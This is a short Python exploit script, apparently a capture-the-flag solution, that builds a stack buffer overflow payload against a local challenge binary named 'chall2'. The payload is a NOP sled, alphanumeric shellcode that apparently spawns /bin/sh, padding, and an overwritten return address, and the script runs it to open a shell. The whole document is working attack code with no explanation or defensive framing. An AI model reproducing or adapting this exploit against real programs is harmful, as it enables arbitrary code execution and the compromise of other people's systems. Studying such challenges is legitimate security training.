import os 

print("[*] Loading NOP")
z = "\x90"*48
print("[*] Loading alphanumeric")
z += "j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A"
print("[*] Loading syscall")
z += "D"*16
print("[*] Loading JMP and landing address")
z += "\xff\xff\x79\xf7\xff\xbf"
print("[*] Popping the shell...")
os.system("./chall2 " + z)
